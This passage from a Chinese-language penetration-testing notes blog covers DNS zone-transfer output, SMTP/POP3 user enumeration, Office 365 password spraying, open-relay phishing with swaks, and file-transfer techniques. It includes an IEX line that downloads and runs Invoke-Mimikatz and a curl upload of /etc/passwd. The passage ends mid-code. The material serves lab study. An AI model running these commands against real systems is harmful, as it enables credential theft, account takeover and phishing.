ALT2.ASPMX.L.GOOGLE.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN A 5.196.105.14\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN NS nsztm1.digi.ninja.\n&#x27;</span><br><span class="line">               &#x27;@ 7200 IN NS nsztm2.digi.ninja.&#x27;,</span><br><span class="line"> &lt;DNS name _acme-challenge&gt;: &#x27;_acme-challenge 301 IN TXT &#x27;</span><br><span class="line">                             &#x27;&quot;6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI&quot;&#x27;,</span><br><span class="line"> &lt;DNS name _sip._tcp&gt;: &#x27;_sip._tcp 14000 IN SRV 0 0 5060 www&#x27;,</span><br><span class="line"> &lt;DNS name 14.105.196.5.IN-ADDR.ARPA&gt;: &#x27;14.105.196.5.IN-ADDR.ARPA 7200 IN PTR &#x27;</span><br><span class="line">                                       &#x27;www&#x27;,</span><br><span class="line"> &lt;DNS name asfdbauthdns&gt;: &#x27;asfdbauthdns 7900 IN AFSDB 1 asfdbbox&#x27;,</span><br><span class="line"> &lt;DNS name asfdbbox&gt;: &#x27;asfdbbox 7200 IN A 127.0.0.1&#x27;,</span><br><span class="line"> &lt;DNS name asfdbvolume&gt;: &#x27;asfdbvolume 7800 IN AFSDB 1 asfdbbox&#x27;,</span><br><span class="line"> &lt;DNS name canberra-office&gt;: &#x27;canberra-office 7200 IN A 202.14.81.230&#x27;,</span><br><span class="line"> &lt;DNS name cmdexec&gt;: &#x27;cmdexec 300 IN TXT &quot;; ls&quot;&#x27;,</span><br><span class="line"> &lt;DNS name contact&gt;: &#x27;contact 2592000 IN TXT &quot;Remember to call or email Pippa &#x27;</span><br><span class="line">                     &#x27;on +44 123 4567890 or pippa@zonetransfer.me when making &#x27;</span><br><span class="line">                     &#x27;DNS changes&quot;&#x27;,</span><br><span class="line"> &lt;DNS name dc-office&gt;: &#x27;dc-office 7200 IN A 143.228.181.132&#x27;,</span><br><span class="line"> &lt;DNS name deadbeef&gt;: &#x27;deadbeef 7201 IN AAAA dead:beaf::&#x27;,</span><br><span class="line"> &lt;DNS name dr&gt;: &#x27;dr 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m&#x27;,</span><br><span class="line"> &lt;DNS name DZC&gt;: &#x27;DZC 7200 IN TXT &quot;AbCdEfG&quot;&#x27;,</span><br><span class="line"> &lt;DNS name email&gt;: &#x27;email 2222 IN NAPTR 1 1 &quot;P&quot; &quot;E2U+email&quot; &quot;&quot; &#x27;</span><br><span class="line">                   &#x27;email.zonetransfer.me\n&#x27;</span><br><span class="line">                   &#x27;email 7200 IN A 74.125.206.26&#x27;,</span><br><span class="line"> &lt;DNS name Hello&gt;: &#x27;Hello 7200 IN TXT &quot;Hi to Josh and all his class&quot;&#x27;,</span><br><span class="line"> &lt;DNS name home&gt;: &#x27;home 7200 IN A 127.0.0.1&#x27;,</span><br><span class="line"> &lt;DNS name Info&gt;: &#x27;Info 7200 IN TXT &quot;ZoneTransfer.me service provided by Robin &#x27;</span><br><span class="line">                  &#x27;Wood - robin@digi.ninja. See &#x27;</span><br><span class="line">                  &#x27;http://digi.ninja/projects/zonetransferme.php for more &#x27;</span><br><span class="line">                  &#x27;information.&quot;&#x27;,</span><br><span class="line"> &lt;DNS name internal&gt;: &#x27;internal 300 IN NS intns1\ninternal 300 IN NS intns2&#x27;,</span><br><span class="line"> &lt;DNS name intns1&gt;: &#x27;intns1 300 IN A 81.4.108.41&#x27;,</span><br><span class="line"> &lt;DNS name intns2&gt;: &#x27;intns2 300 IN A 167.88.42.94&#x27;,</span><br><span class="line"> &lt;DNS name office&gt;: &#x27;office 7200 IN A 4.23.39.254&#x27;,</span><br><span class="line"> &lt;DNS name ipv6actnow.org&gt;: &#x27;ipv6actnow.org 7200 IN AAAA &#x27;</span><br><span class="line">                            &#x27;2001:67c:2e8:11::c100:1332&#x27;,</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><p>还有 DNS spoofing …</p><hr><h1 id="Email"><a href="#Email" class="headerlink" title="Email"></a>Email</h1><p>识别邮箱服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ host -t MX hackthebox.eu</span><br><span class="line">hackthebox.eu mail is handled by 1 aspmx.l.google.com.</span><br><span class="line"></span><br><span class="line">$ dig mx inlanefreight.com | grep &quot;MX&quot; | grep -v &quot;;&quot;</span><br><span class="line">inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.</span><br><span class="line"></span><br><span class="line">$ host -t A mail1.inlanefreight.htb.</span><br><span class="line">mail1.inlanefreight.htb has address 10.129.14.128</span><br></pre></td></tr></table></figure><p>如果目标是自定义邮件服务器，可以枚举以下端口</p><table><thead><tr><th>Port</th><th>Service</th></tr></thead><tbody><tr><td><code>TCP/25</code></td><td>SMTP 未加密</td></tr><tr><td><code>TCP/143</code></td><td>IMAP4 未加密</td></tr><tr><td><code>TCP/110</code></td><td>POP3 未加密</td></tr><tr><td><code>TCP/465</code></td><td>SMTP 加密</td></tr><tr><td><code>TCP/587</code></td><td>SMTP 加密&#x2F; <a href="https://en.wikipedia.org/wiki/Opportunistic_TLS">TLS</a></td></tr><tr><td><code>TCP/993</code></td><td>IMAP4 加密</td></tr><tr><td><code>TCP/995</code></td><td>POP3 加密</td></tr></tbody></table><h2 id="nmap-6"><a href="#nmap-6" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST</span><br><span class="line">Nmap scan report for 10.129.14.128</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">25/tcp open  smtp    Postfix smtpd</span><br><span class="line">|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, </span><br><span class="line">MAC Address: 00:00:00:00:00:00 (VMware)</span><br></pre></td></tr></table></figure><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>枚举有效用户名 <code>VRFY</code>,<code>EXPN</code>,<code>RCPT TO</code>,<code>USER</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">telnet 10.10.110.20 25</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VRFY 此命令指示接收 SMTP 服务器检查特定电子邮件用户名的有效性。</span></span><br><span class="line">VRFY root</span><br><span class="line">252 2.0.0 root</span><br><span class="line"></span><br><span class="line">VRFY new-user</span><br><span class="line">550 5.1.1 &lt;new-user&gt;: Recipient address rejected: User unknown in local recipient table</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">EXPN 和 VRFY 类似，不同之处在于，当与分发列表一起使用时，它将列出该列表上的所有用户。</span></span><br><span class="line">EXPN john</span><br><span class="line">250 2.1.0 john@inlanefreight.htb</span><br><span class="line"></span><br><span class="line">EXPN support-team</span><br><span class="line">250 2.0.0 carol@inlanefreight.htb</span><br><span class="line">250 2.1.5 elisa@inlanefreight.htb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">RCPT TO 标识电子邮件消息的收件人。可以针对给定消息重复此命令多次，以将单个消息传递给多个收件人。</span></span><br><span class="line">MAIL FROM:test@htb.com</span><br><span class="line">it is</span><br><span class="line">250 2.1.0 test@htb.com... Sender ok</span><br><span class="line"></span><br><span class="line">RCPT TO:kate</span><br><span class="line">550 5.1.1 kate... User unknown</span><br><span class="line"></span><br><span class="line">RCPT TO:john</span><br><span class="line">250 2.1.5 john... Recipient ok</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用POP3协议根据服务实现枚举用户。</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">telnet 10.10.110.20 110</span></span><br><span class="line"></span><br><span class="line">Trying 10.10.110.20...</span><br><span class="line">Connected to 10.10.110.20.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">+OK POP3 Server ready</span><br><span class="line"></span><br><span class="line">USER julio</span><br><span class="line"></span><br><span class="line">-ERR</span><br><span class="line"></span><br><span class="line">USER john</span><br><span class="line"></span><br><span class="line">+OK</span><br></pre></td></tr></table></figure><h2 id="smtp-user-enum"><a href="#smtp-user-enum" class="headerlink" title="smtp-user-enum"></a>smtp-user-enum</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</span><br></pre></td></tr></table></figure><h2 id="cloud"><a href="#cloud" class="headerlink" title="cloud"></a>cloud</h2><p><a href="https://github.com/0xZDH/o365spray">O365spray</a>是一款针对 Microsoft Office 365（O365）的用户名枚举和密码喷洒工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 o365spray.py --validate --domain msplaintext.xyz</span><br><span class="line"></span><br><span class="line">python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz    </span><br></pre></td></tr></table></figure><h2 id="spraying-2"><a href="#spraying-2" class="headerlink" title="spraying"></a>spraying</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.txt -p &#x27;Company01!&#x27; -f 10.10.110.20 pop3</span><br><span class="line"></span><br><span class="line">python3 o365spray.py --spray -U usersfound.txt -p &#x27;March2022!&#x27; --count 1 --lockout 1 --domain msplaintext.xyz</span><br></pre></td></tr></table></figure><h2 id="Open-Relay"><a href="#Open-Relay" class="headerlink" title="Open Relay"></a>Open Relay</h2><p>开放中继是一种简单邮件传输协议 ( <code>SMTP</code>) 服务器，配置不当，允许未经身份验证的电子邮件中继。滥用此漏洞进行网络钓鱼，以不存在的用户身份发送电子邮件或伪造他人的电子邮件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p25 -Pn --script smtp-open-relay 10.10.11.213</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT</span><br><span class="line">Nmap scan report for 10.10.11.213</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">25/tcp open  smtp</span><br><span class="line">|_smtp-open-relay: Server is an open relay (14/16 tests)</span><br></pre></td></tr></table></figure><p>接下来，可以使用任何邮件客户端连接到邮件服务器并发送我们的电子邮件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#x27;Subject: Company Notification&#x27; --body &#x27;Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/&#x27; --server 10.10.11.213</span><br><span class="line"></span><br><span class="line">=== Trying 10.10.11.213:25...</span><br><span class="line">=== Connected to 10.10.11.213.</span><br><span class="line">&lt;-  220 mail.localdomain SMTP Mailer ready</span><br><span class="line"> -&gt; EHLO parrot</span><br><span class="line">&lt;-  250-mail.localdomain</span><br><span class="line">&lt;-  250-SIZE 33554432</span><br><span class="line">&lt;-  250-8BITMIME</span><br><span class="line">&lt;-  250-STARTTLS</span><br><span class="line">&lt;-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1</span><br><span class="line">&lt;-  250 HELP</span><br><span class="line"> -&gt; MAIL FROM:&lt;notifications@inlanefreight.com&gt;</span><br><span class="line">&lt;-  250 OK</span><br><span class="line"> -&gt; RCPT TO:&lt;employees@inlanefreight.com&gt;</span><br><span class="line">&lt;-  250 OK</span><br><span class="line"> -&gt; DATA</span><br><span class="line">&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line"> -&gt; Date: Thu, 29 Oct 2020 01:36:06 -0400</span><br><span class="line"> -&gt; To: employees@inlanefreight.com</span><br><span class="line"> -&gt; From: notifications@inlanefreight.com</span><br><span class="line"> -&gt; Subject: Company Notification</span><br><span class="line"> -&gt; Message-Id: &lt;20201029013606.775675@parrot&gt;</span><br><span class="line"> -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; .</span><br><span class="line">&lt;-  250 OK</span><br><span class="line"> -&gt; QUIT</span><br><span class="line">&lt;-  221 Bye</span><br><span class="line">=== Connection closed with remote host.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Service-Test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File Transfer</title>
      <link href="/2024/10/02/pentest/lateral/File%20Transfer/"/>
      <url>/2024/10/02/pentest/lateral/File%20Transfer/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:port</span><br><span class="line">python3 -m http.server [port]# 默认端口为 8000</span><br><span class="line">ruby -run -e httpd . [-p port]# 默认端口为 8080</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wget http://ip/file</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">curl -O http://ip/file</span></span><br></pre></td></tr></table></figure><h2 id="Nginx-PUT"><a href="#Nginx-PUT" class="headerlink" title="Nginx PUT"></a>Nginx PUT</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /var/www/uploads/SecretUploadDirectory</span><br><span class="line">sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory</span><br></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;upload.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 9001;</span><br><span class="line">    </span><br><span class="line">    location /SecretUploadDirectory/ &#123;</span><br><span class="line">        root    /var/www/uploads;</span><br><span class="line">        dav_methods PUT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链接到<code>sites-enabled</code>目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart nginx.service</span><br></pre></td></tr></table></figure><p>端口被占用，可删除默认配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /etc/nginx/sites-enabled/default</span><br></pre></td></tr></table></figure><p>上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt</span><br></pre></td></tr></table></figure><h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh user@host &quot;cat &gt; /path/to/remote/file&quot; &lt; /path/to/local/file# 上传</span><br><span class="line">ssh user@host &quot;cat /path/to/remote/file&quot; &gt; /path/to/local/file# 下载</span><br></pre></td></tr></table></figure><h1 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scp file1 file2 user@host:/destination# 上传</span><br><span class="line">scp user@host:/source /destination# 下载</span><br><span class="line">-r 递归</span><br><span class="line">-P 指定端口</span><br><span class="line">-v 详细信息</span><br><span class="line">-C 压缩</span><br><span class="line">-o Compression=no 禁止压缩</span><br></pre></td></tr></table></figure><h1 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h1><h2 id="Web-Download"><a href="#Web-Download" class="headerlink" title="Web Download"></a>Web Download</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">New-Object</span> Net.WebClient).DownloadFile(<span class="string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#x27;</span>,<span class="string">&#x27;C:\Users\Public\Downloads\PowerView.ps1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">New-Object</span> Net.WebClient).DownloadFileAsync(<span class="string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&#x27;</span>, <span class="string">&#x27;C:\Users\Public\Downloads\PowerViewAsync.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Fileless"><a href="#Fileless" class="headerlink" title="Fileless"></a>Fileless</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># IEX(Invoke-Expression): 执行一个字符串形式的命令或表达式</span></span><br></pre></td></tr></table></figure><h2 id="Invoke-WebRequest"><a href="#Invoke-WebRequest" class="headerlink" title="Invoke-WebRequest"></a>Invoke-WebRequest</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 <span class="literal">-OutFile</span> PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 缩写</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">iwr</span> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 <span class="literal">-o</span> PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可能存在 Internet Explorer 首次启动配置尚未完成的情况，导致无法下载。</span></span><br><span class="line"><span class="comment"># 可以使用参数来绕过这个问题-UseBasicParsing.</span></span><br></pre></td></tr></table></figure><h2 id="PowerShell-Session"><a href="#PowerShell-Session" class="headerlink" title="PowerShell Session"></a>PowerShell Session</h2><p>PowerShell 远程处理会创建 HTTP 和 HTTPS 侦听器。侦听器在默认端口 TCP&#x2F;5985（对于 HTTP）和 TCP&#x2F;5986（对于 HTTPS）上运行。需要具有管理访问权限、成为<code>Remote Management Users</code>组成员或在会话配置中拥有 PowerShell 远程的明确权限。</p><p>target</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 5985 端口状态</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Test-NetConnection</span> <span class="literal">-ComputerName</span> DATABASE01 <span class="literal">-Port</span> <span class="number">5985</span></span><br><span class="line"></span><br><span class="line">ComputerName     : DATABASE01</span><br><span class="line">RemoteAddress    : <span class="number">192.168</span>.<span class="number">1.101</span></span><br><span class="line">RemotePort       : <span class="number">5985</span></span><br><span class="line">InterfaceAlias   : Ethernet0</span><br><span class="line">SourceAddress    : <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line">TcpTestSucceeded : True</span><br></pre></td></tr></table></figure><p>host</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建 DATABASE01 远程会话</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Session</span> = <span class="built_in">New-PSSession</span> <span class="literal">-ComputerName</span> DATABASE01</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-Item</span> <span class="literal">-Path</span> C:\samplefile.txt <span class="literal">-ToSession</span> <span class="variable">$Session</span> <span class="literal">-Destination</span> C:\Users\Administrator\Desktop\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-Item</span> <span class="literal">-Path</span> <span class="string">&quot;C:\Users\Administrator\Desktop\DATABASE.txt&quot;</span> <span class="literal">-Destination</span> C:\ <span class="literal">-FromSession</span> <span class="variable">$Session</span></span><br></pre></td></tr></table></figure><h1 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>encode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64 shell -w 0# -w 0, 不换行</span><br><span class="line">echo &quot;&lt;SNIP&gt;&quot; | base64 -d &gt; shell</span><br></pre></td></tr></table></figure><p>decode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d &gt; hosts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">md5sum hosts </span><br><span class="line"></span><br><span class="line">3688374325b992def12793500307566d  hosts</span><br></pre></td></tr></table></figure><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>encode</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; [<span class="type">Convert</span>]::ToBase64String((<span class="built_in">Get-Content</span> <span class="literal">-path</span> <span class="string">&quot;C:\Windows\system32\drivers\etc\hosts&quot;</span> <span class="literal">-Encoding</span> byte))</span><br><span class="line"></span><br><span 